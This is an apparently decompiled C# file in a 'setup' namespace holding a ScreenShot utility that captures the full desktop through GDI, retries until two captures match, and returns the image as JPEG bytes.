using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace setup;

internal class ScreenShot
{
	private const int WaitScreenTry = 3;

	private const int WaitScreenShotPause = 1000;

	[DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
	private static extern int memcmp(IntPtr b1, IntPtr b2, int count);

	[DllImport("gdi32.dll")]
	private static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

	public static Rectangle GetDisplayBounds()
	{
		Graphics val = Graphics.FromHwnd(IntPtr.Zero);
		try
		{
			IntPtr hdc = val.GetHdc();
			return new Rectangle(0, 0, GetDeviceCaps(hdc, 118), GetDeviceCaps(hdc, 117));
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	public static byte[] MakeDesktopScreenshot()
	{
		return MakeScreenshot(GetDisplayBounds());
	}

	public static byte[] MakeScreenshot(Rectangle Bounds)
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		Bitmap val = new Bitmap(Bounds.Width, Bounds.Height);
		try
		{
			Bitmap val2 = new Bitmap(Bounds.Width, Bounds.Height);
			try
			{
				for (int i = 0; i < 3; i++)
				{
					Graphics val3 = Graphics.FromImage((Image)(object)val);
					try
					{
						Graphics val4 = Graphics.FromImage((Image)(object)val2);
						try
						{
							CopyScreen(val3, Bounds.Size);
							CopyScreen(val4, Bounds.Size);
							if (CompareImages(val, val2))
							{
								break;
							}
						}
						finally
						{
							((IDisposable)val4)?.Dispose();
						}
					}
					finally
					{
						((IDisposable)val3)?.Dispose();
					}
				}
				return ImageToBytes(val2);
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	private static byte[] ImageToBytes(Bitmap Img)
	{
		MemoryStream memoryStream = new MemoryStream();
		((Image)Img).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
		return memoryStream.ToArray();
	}

	private static BitmapData LockBits(Bitmap Im)
	{
		return Im.LockBits(new Rectangle(new Point(0, 0), ((Image)Im).get_Size()), (ImageLockMode)1, (PixelFormat)2498570);
	}

	private static bool CompareImages(Bitmap B1, Bitmap B2)
	{
		if (B1 == null == (B2 == null) && !(((Image)B1).get_Size() != ((Image)B2).get_Size()))
		{
			BitmapData val = LockBits(B1);
			BitmapData val2 = LockBits(B2);
			try
			{
				IntPtr scan = val.get_Scan0();
				IntPtr scan2 = val2.get_Scan0();
				int count = val.get_Stride() * ((Image)B1).get_Height();
				return memcmp(scan, scan2, count) == 0;
			}
			finally
			{
				B1.UnlockBits(val);
				B2.UnlockBits(val2);
			}
		}
		return false;
	}

	private static void CopyScreen(Graphics Graph, Size RegionSize)
	{
		Thread.Sleep(1000);
		Graph.CopyFromScreen(Point.Empty, Point.Empty, RegionSize);
	}
}
